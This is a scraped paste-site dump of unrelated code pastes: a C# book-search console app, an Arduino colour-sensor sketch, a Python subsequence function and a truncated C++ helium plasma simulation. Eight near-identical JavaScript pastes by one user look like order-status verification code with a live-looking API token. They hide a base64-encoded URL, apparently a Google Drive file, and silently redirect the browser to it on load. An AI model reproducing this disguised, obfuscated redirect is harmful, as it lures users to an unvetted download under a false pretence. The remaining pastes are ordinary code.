            foreach (Book book in _books)
            {
                if (searchName == book.Title)
                {
                    book.ShowInfo();
                    isFoundName = true;
                }
            }

            if (!isFoundName)
            {
                Console.WriteLine(""  "");
            }
        }

        private void FindByAuthor()
        {
            bool isFoundAuthor = false;
            string searchAuthor = Console.ReadLine();

            foreach (Book book in _books)
            {
                if (searchAuthor == book.Author)
                {
                    book.ShowInfo();
                    isFoundAuthor = true;
                }
            }

            if (!isFoundAuthor)
            {
                Console.WriteLine(""  "");
            }
        }

        private void FindByYearOfRelease()
        {
            bool isFoundYearOfRelease = false;
            int searchYear = ReadNumber(""     : "");

            foreach (Book book in _books)
            {
                if (searchYear == book.YearOfRelease)
                {
                    book.ShowInfo();
                    isFoundYearOfRelease = true;
                }
            }

            if (!isFoundYearOfRelease)
            {
                Console.WriteLine($""    ."");
            }
        }

        private bool ExitProgram()
        {
            Console.WriteLine(""   !"");

            return false;
        }

        private bool TryGetBook(int bookNumber, out Book foundBook)
        {
            foundBook = null;

            bool isBookFound = true;

            foreach (Book book in _books)
            {
                if (book.Number == bookNumber)
                {
                    foundBook = book;

                    return isBookFound;
                }
            }

            return false;
        }

        private bool IsEmptyListBooks()
        {
            bool isEmpty = false;

            if (_books.Count == 0)
            {
                isEmpty = true;
                Console.WriteLine("" !"");
            }

            return isEmpty;
        }

        private int ReadNumber(string message)
        {
            int number = 0;
            bool isNumber = false;

            while (isNumber == false)
            {
                Console.Write(message);
                isNumber = int.TryParse(Console.ReadLine(), out number);
            }

            return number;
        }
    }
}
"
kiRUBBpa,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:52:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34745/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
H1vqUnWs,"""Sensor Data"" rev_01",pleasedontcode,Arduino,Saturday 19th of April 2025 02:41:24 PM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: ""Sensor Data""
	- Source Code NOT compiled for: Arduino Uno
	- Source Code created on: 2025-04-19 19:39:23

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* i need the sensor to be very accurate in the color */
	/* coding  I need to be able to read the codes */
	/* through my software */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
#include <FreqCount.h>	//https://github.com/PaulStoffregen/FreqCount
#include <DHT.h>	//https://github.com/adafruit/DHT-sensor-library

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);
void GetData(); // Added prototype for GetData function
void ReadColorData(); // New prototype for reading color data

/***** DEFINITION OF DIGITAL INPUT PINS *****/
const uint8_t myDHT22_DHT22_DOUT_PIN_D2		= 2;

// Added definitions for the photodiode module pins
#define s0 8       // Module pins wiring
#define s1 9
#define s2 10
#define s3 11
#define out 12

int data=0;        // This is where we're going to stock our values

/****** DEFINITION OF LIBRARIES CLASS INSTANCES*****/
// Instantiate DHT sensor
DHT dht(myDHT22_DHT22_DOUT_PIN_D2, DHT22); // Assuming DHT22 sensor

void setup(void)
{
	// put your setup code here, to run once:

	pinMode(myDHT22_DHT22_DOUT_PIN_D2, INPUT_PULLUP);

	// Initialize photodiode pins
	pinMode(s0, OUTPUT);    // pin modes
	pinMode(s1, OUTPUT);
	pinMode(s2, OUTPUT);
	pinMode(s3, OUTPUT);
	pinMode(out, INPUT);

	Serial.begin(9600);   // Initialize the serial monitor baud rate
	
	digitalWrite(s0, HIGH);  // Putting S0/S1 on HIGH/HIGH levels means the output frequency scaling is at 100% (recommended)
	digitalWrite(s1, HIGH); // LOW/LOW is off HIGH/LOW is 20% and LOW/HIGH is 2%

	// Initialize DHT sensor
	dht.begin();
}

void loop(void)
{
	// put your main code here, to run repeatedly:
	ReadColorData(); // Call to read color data

	Serial.println();

	delay(2000);
}

void GetData(){
	data = pulseIn(out, LOW);       // here we wait until ""out"" goes LOW, we start measuring the duration and stops when ""out"" is HIGH again
	Serial.print(data);          // it's a time duration measured, which is related to frequency as the sensor gives a frequency depending on the color
	Serial.print(""\t"");          // The higher the frequency the lower the duration
	delay(20);
}

void ReadColorData() {
	// Read Red value
	digitalWrite(s2, LOW);
	digitalWrite(s3, LOW);
	Serial.print(""Red value= ""); 
	GetData();                   // Executing GetData function to get the value

	// Read Blue value
	digitalWrite(s2, LOW);
	digitalWrite(s3, HIGH);
	Serial.print(""Blue value= "");
	GetData();

	// Read Green value
	digitalWrite(s2, HIGH);
	digitalWrite(s3, HIGH);
	Serial.print(""Green value= "");
	GetData();
}

/* END CODE */"
65g975K4,Market.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:36:59 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33249/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KeqsSnP9,Untitled,WantingTrae,JavaScript,Saturday 19th of April 2025 02:21:15 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93137/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
zMwyGTwD,Products.js,WantingTrae,JavaScript,Saturday 19th of April 2025 02:05:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67536/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Z8zsHNDB,Order.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:50:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34895/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eThspaSg,Market.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:34:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16129/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BnJ1K7Pd,Is subsequence,smj007,Python,Saturday 19th of April 2025 01:31:13 PM CDT,"class Solution:
    def isSubsequence(self, s: str, t: str) -> bool:

        i = 0
        j = 0

        while (i < len(s) and j < len(t)):
            if s[i] == t[j]:
                i += 1
            j += 1

        return i == len(s)

        # if j == len(t) and not i == len(s):
        #     return False
        # elif i == len(s) and not j == len(t):
        #     return True
        # elif i == len(s) and j == len(t):
        #     return True

"
nwm2LGJL,Untitled,WantingTrae,JavaScript,Saturday 19th of April 2025 01:19:17 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/86764/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Wd1CPvcd,Products.js,WantingTrae,JavaScript,Saturday 19th of April 2025 01:03:54 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/66479/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RiBcUaFE,excitation_radiative_decay_added,phystota,C++,Saturday 19th of April 2025 12:56:16 PM CDT,"#include <iostream>
#include <random>
#include <fstream>
#include <assert.h>

#include <math.h>
#include <time.h>
#include <iomanip>  // For std::fixed and std::setprecision

#include <algorithm>  // For std::shuffle
#include <numeric>    // For std::iota

//physical constants

#define m_e 9.1093837E-31 // electron mass in kg
#define M_n 6.6464731E-27 // Helium atom mass
#define k_b 1.380649E-23 // Boltzmann constant
#define q 1.602176634E-19 // elementary charge    - eV -> J transfer param
#define Coulomb_log 15.87 // Coulomb logarithm
#define epsilon_0 8.854188E-12 // Vacuum permittivity
#define Coulomb_const pow(q,4)/(pow(4.0*M_PI*epsilon_0,2)) // e^4/(4*pi*eps0)^2
#define thresh1 19.82 // threshold energy excitation tripet state
#define thresh2 20.61 // threshold energy excitation singlet state
#define tau_singlet 0.0195

// simulation parameters

#define n_e 50000
// #define N_He 1000000 // Helium neutrals number
#define T_n 2.0 // Helium neutral temperature in eV
#define T_e 5.0    // electron Maxwell initial distribution
#define Emin 0.0
#define Emax 3000.0
#define Volume 1.0E-12 // Volume to calculate netral density and collision frequency 
#define time 1.0E-3 // 500 microsec time to equalibrate the system
#define dopant 1.0E-5 // addition to avoid zero
#define E_reduced 0.0 // constant electrin field along z-axis

#define bin_width 0.05 // keep energy step ~ this to maintain cross-section clarity (Ramsauer minimum etc)
#define N ( (int)((Emax-Emin)/bin_width) + 1) // add 1 to include E_max if needed?

// handling final energy bin

#define bin_width_smooth 0.05 // energy bin for smooth final distribution
#define N_smooth ( (int)((Emax-Emin)/bin_width_smooth) )



double solve_A(double s) { // Netwon method solver

    if (s > 3) {
        return 3*exp(-s);
    }
    if (s < 0.01) {
        return 1.0/s;
    }
    
    double A0 = 0.01; // initial guess
    double A = A0;  //starting with initial guess
    double tol = 1.0E-7; // accuracy

             
    for (int i = 0; i < 1000; i++){

        double tanhA = tanh(A);
        // Avoid division by an extremely small tanh(A)
        if (fabs(tanhA) < 1e-12) {
            std::cerr << ""tanh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-7;
        }        

        double f = 1.0 / tanhA - 1.0 / A - exp(-s);
        if (fabs(f) < tol)
            break;

        double sinhA = sinh(A);
        if (fabs(sinhA) < 1e-12) {
            std::cerr << ""sinh(A) too small, returning fallback at iteration "" << i << ""\n"";
            return 1.0E-5;
        }

        double dfdA = -1.0/(sinh(A)*sinh(A)) + 1.0/(A*A);

        // Check if derivative is too close to zero to avoid huge updates
        if (fabs(dfdA) < 1e-12) {
            std::cerr << ""dfdA is too small at iteration "" << i << "", returning fallback\n"";
            if (s < 0.01) {
//                std::cout << ""Small s! Huge A!"" << ""\n"";
                return 1.0/s;
            }
            if (s > 3) {
                return 3.0*exp(-s);
            }
        }        

        A -= f/dfdA;

        // Early check for numerical issues
        if (std::isnan(A) || std::isinf(A)) {
            std::cerr << ""Numerical error detected, invalid A at iteration "" << i << ""\n"";
            return (A > 0) ? 1.0E-5 : -1.0E-5;  // Fallback value based on sign
        }        


    }

    return A;
}

struct Electron {

    //velocity components
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;
    //energy in eV
    double energy = 0.0;
    //Collision flag
    bool collided_en = false;
    bool collided_ee = false;

    // initializing Maxwell-Boltzmann distribution with T_e
    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/m_e);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }


};

struct CrossSection {
    double energy;
    double sigma;
};

double interpolate (double energy, const std::vector<CrossSection>& CS) {


    if (energy < CS.front().energy) {
//        std::cout << "" required energy value lower than range of cross-section data at energy: "" << energy << ""\n"";
        return 0.0;
    }
    if (energy > CS.back().energy) {
//        std::cout << "" required energy value higher than range of cross-section data"" << ""\n"";
        return 0.0;        
    }

    int step = 0;   
        while (step < CS.size() && energy > CS[step].energy) {
            step++;
        }

    double k = (CS[step].sigma - CS[step-1].sigma)/(CS[step].energy - CS[step-1].energy);
    double m = CS[step].sigma - k*CS[step].energy;
    
    return k*energy + m; 
}


struct NeutralParticle {

    double energy = 0.0;
    double vx = 0.0;
    double vy = 0.0;
    double vz = 0.0;

    void initialize(std::mt19937& gen, std::uniform_real_distribution<double>& dis, std::gamma_distribution<double>& maxwell) {

        double R = dis(gen);

        // velocity angles in spherical coordinates
        double phi = 2*M_PI*dis(gen);
        double cosTheta = 2.0*dis(gen) - 1.0;
        double sinTheta = sqrt(1.0 - cosTheta*cosTheta); 

            
        energy = maxwell(gen); // neutrals energies sampled as Maxwell distribution in eV
            
        double speed = sqrt(2*energy*q/M_n);

        //velocity components of neutrals in m/s
        vx = speed * sinTheta * cos(phi);
        vy = speed * sinTheta * sin(phi);
        vz = speed * cosTheta;
    }
    
};

struct Excited_neutral {

    double energy;
    double vx;
    double vy;
    double vz;
    
};



int main() {

    clock_t start = clock();

    int N_He = 10000000;

    std::vector<Electron> electrons(n_e); // better to use vector instead of simple array as it's dynamically allocated (beneficial for ionization)
//    std::vector<NeutralParticle> neutrals(N_He); // I don't need a vector of neutrals bcs it's like a backhround in MCC-simulation

    std::vector<int> histo_random(N, 0); // initialize N size zero-vector for random (initial) histogram
    std::vector<int> histo_maxwell(N, 0); // initialize N size zero-vector for maxwellian histogram
    std::vector<int> histo_neutral(N, 0); // initialize N size zero-vector for neutral distribution histogram
    std::vector<int> histo_excited(N, 0); // initialize N size zero-vector for excited He distribution histogram

    std::vector<double> elastic_vec(N, 0); // precompiled elastic cross-section-energy vector
    std::vector<double> inelastic1_vec(N, 0); // precompiled inelastic(triplet excitation) cross-section-energy vector
    std::vector<double> inelastic2_vec(N, 0); // precompiled inelastic(singlet excitation) cross-section-energy vector    
    std::vector<double> superelastic1_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector
    std::vector<double> superelastic2_vec(N, 0); // precompiled superelastic(triplet de-excitation) cross-section-energy vector

    std::random_device rd; 
    std::mt19937 gen(rd());
    std::uniform_real_distribution<double> dis(0.0, 1.0);
    std::gamma_distribution<double> maxwell_neutral(1.5, T_n);
    std::gamma_distribution<double> maxwell_electron(1.5, T_e);

    std::ifstream elastic_cs_dat(""cross_sections/elastic.dat"");
    if (!elastic_cs_dat.is_open()) {
        std::cerr << ""Error opening elastic cross-sections file!"" << std::endl;
        return 1;
    }    

    std::ifstream excitation1_cs_dat(""cross_sections/inelastic_triplet.dat"");
    if (!excitation1_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic triplet cross-sections file!"" << std::endl;
        return 1;
    }

    std::ifstream excitation2_cs_dat(""cross_sections/inelastic_singlet.dat"");
    if (!excitation2_cs_dat.is_open()) {
        std::cerr << ""Error opening inelastic singlet cross-sections file!"" << std::endl;
        return 1;
    }

    // --- starts reading cross section datafiles

//-----------------elastic---------------------------//
    std::vector<CrossSection> elastic_CS_temp;

    double energy, sigma;

    while (elastic_cs_dat >> energy >> sigma) {
        elastic_CS_temp.push_back({energy, sigma});
    }    
    elastic_cs_dat.close();

    energy = 0.0;
    sigma = 0.0;
//-----------------triplet excitation---------------------------//
    std::vector<CrossSection> inelastic1_CS_temp;

    while (excitation1_cs_dat >> energy >> sigma) {
        inelastic1_CS_temp.push_back({energy, sigma});
    }    
    excitation1_cs_dat.close();    
//-----------------singlet excitation---------------------------//
    energy = 0.0;
    sigma = 0.0;

    std::vector<CrossSection> inelastic2_CS_temp;

    while (excitation2_cs_dat >> energy >> sigma) {
        inelastic2_CS_temp.push_back({energy, sigma});
    }    
    excitation2_cs_dat.close();    

    // --- finish reading cross-section datafiles  

    std::ofstream file0(""output_files/velocities.dat"");    
    std::ofstream file1(""output_files/energies.dat"");        
    std::ofstream file2(""output_files/energies_final.dat"");    
    std::ofstream file3(""output_files/histo_random.dat"");    
    file3 << std::fixed << std::setprecision(10);
    
    std::ofstream file4(""output_files/histo_maxwell.dat"");
    file4 << std::fixed << std::setprecision(10);           
    
    std::ofstream file5(""output_files/neutral_distribution.dat"");    
    std::ofstream file6(""output_files/E*f(E).dat"");    
    std::ofstream file7(""output_files/nu_max.dat"");
    std::ofstream file8(""output_files/electron_mean_energy.dat"");
    std::ofstream file9(""output_files/nu_elastic_average_initial.dat"");
    std::ofstream file10(""output_files/nu_inelastic1_average_initial.dat"");
    std::ofstream file11(""output_files/nu_elastic_average_final.dat"");
    std::ofstream file12(""output_files/nu_inelastic1_average_final.dat""); 
    std::ofstream file13(""output_files/log_output.dat"");  
    std::ofstream file14(""output_files/excited_energies.dat"");       
    std::ofstream file15(""output_files/excited_histo.dat"");             
    std::ofstream file_temp(""output_files/collision_rates.dat"");
    std::ofstream file16(""output_files/energy_gain.dat"");  

    // Initialize all electrons
    for (auto& e : electrons) {
        e.initialize(gen, dis, maxwell_electron);
    }

    // precalculate cross-sections for each energy bin
    for (int i = 0; i < N; i++){
        elastic_vec[i] = interpolate(bin_width*(i+0.5), elastic_CS_temp); //elastiuc
        inelastic1_vec[i] = interpolate(bin_width*(i+0.5), inelastic1_CS_temp); //triplet excitation
        inelastic2_vec[i] = interpolate(bin_width*(i+0.5), inelastic2_CS_temp); //singlet excitation
    }

    // precalculate superelastic cross-section (triplet -> ground) for each energy bin
    // detailed balance gives: sigma_j_i(E) = (g_i/g_j)*((E+theshold)/E)*sigma_i_j(E+theshold)
    for (int i = 0; i < N; i++){
        double energy = Emin + (i + 0.5) * bin_width;
        int thresh_bin = (int)( (thresh1 - Emin)/bin_width ); // calculating bin for threshold energy
        superelastic1_vec[i] = (1.0/3.0)*((energy + thresh1)/energy)*interpolate(energy + thresh1, inelastic1_CS_temp); // using detailed balance, calculating backward deexcitation cross-section
        superelastic2_vec[i] = (1.0/1.0)*((energy + thresh2)/energy)*interpolate(energy + thresh2, inelastic2_CS_temp);
    }

    for (int i = 0; i < n_e; i++){
        file1 << i << "" "" << electrons.at(i).energy << ""\n"";
        file0 << i << "" "" << electrons[i].vx << "" "" << electrons[i].vy << "" "" << electrons[i].vz << ""\n""; 
    }

    // -----initial electrons energy distribution starts------------////
    for (int i = 0; i < n_e; i++){
        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_random.size())
            histo_random[bin]++;
    }

    for (int i = 0; i < histo_random.size(); i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file3 << bin_center << "" "" <<  static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n""; // this is electron normalized distribution function
    }



    //calculating excited specied population

    /*From Boltzman distribution y_k = g_k*exp(-E_k/kT)/norm, where g_k - stat weight of k-state, 
    E_k - threshold energy for k-state, norm is a total partition function or normaliztion factor     */

    double part_ground = 1.0*exp(-0.0/T_n); // partition function for ground state
    double part_triplet = 3.0*exp(-thresh1/T_n); // partition function for triplet excited state
    double part_singlet = 1.0*exp(-thresh2/T_n); // partition function for singlet excited state
    double part_func_total = part_ground + part_triplet + part_singlet; // total partition function
    double N_trpilet = (part_triplet/part_func_total)*N_He; // population of tripet state 
    double N_singlet = (part_singlet/part_func_total)*N_He; // population of singlet state

    std::vector<Excited_neutral> exc_1(static_cast<int>(N_trpilet));  // vector to track triplet excited atoms of Helium
    std::vector<Excited_neutral> exc_2(static_cast<int>(N_singlet));  // vector to track singlet excited atoms of Helium    

    // adjusting neutrals number:

    N_He -= (N_trpilet + N_singlet);

    std::cout << N_He << ""\n"";

    // initializing excited species with Maxwellian distribution

    for (auto& exc : exc_1) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    for (auto& exc : exc_2) {
    NeutralParticle tmp_neutral;
    tmp_neutral.initialize(gen, dis, maxwell_neutral);
    exc.energy = tmp_neutral.energy;
    exc.vx = tmp_neutral.vx;
    exc.vy = tmp_neutral.vy;
    exc.vz = tmp_neutral.vz;
    }

    std::cout << ""Triplet population initialized: "" << exc_1.size() << ""\n"";
    std::cout << ""Singlet population initialized: "" << exc_2.size() << ""\n"";    

    // calculating excited specied population finished //


    //----- calculating number to calculate nu-average (both elastic/inelastic )from our electron distribution starts---------///
    // --- calculating nu(E)*f(E) for later external integration, using initial f(E)
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
        file10 << bin_center << "" "" << (N_He/Volume)*inelastic1_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    // double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    // double steps = static_cast<int>(time/dt);

    // std::cout << steps << ""\n"";
    // std::cout << dt << ""\n"";

    // //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    // int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;

    // std::cout << ""Ne_collided:"" << Ne_collided << ""\n"";

    int print_interval = 10;
    int el_coll_counter = 0; // track all elastic collisions
    int exc1_coll_counter = 0; // track all triplet excitation collisions
    int exc2_coll_counter = 0; // track all singlet excitation collisions
    int null_coll_counter = 0; // track null-collisions
    int ee_coll_counter = 0; //track e-e Coulomb collisions
    int super1_coll_counter = 0; // track superelastic triplet collisions
    int super2_coll_counter = 0; // track superelastic triplet collisions    


    double a_z = ((-1.0)*q * E_reduced) / m_e;
    double mass_ratio = 2.0*(m_e/M_n);
    double charge_mass_ratio = 0.5*m_e/q;
    double sqrt_charge_mass = sqrt(2*q/m_e);
    double C1 = -1.0*q*E_reduced;
    double C2 = 0.5*C1*C1/m_e;

    double total_time = 5.0E-2; // total calculation time
    double t_elapsed = 0.0;

    std::cout << C1 << ""    "" << C2 << ""\n"";


    // -----calculating nu-max for null-collision method starts ------------////
    double nu_max = 0.0;
    double nu_max_temp = 0.0;
    double sigma_total = 0.0;
    
    for (int i = 0; i < N; i++){
        // Get initial densities
        double n_ground = N_He / Volume;
        double n_excited1 = exc_1.size() / Volume;
        double n_excited2 = exc_2.size() / Volume;
 
        double energy = Emin + (i + 0.5) * bin_width;
 
        // Total collision frequency for this energy bin
        double sigma_total = 
            elastic_vec[i] * n_ground +
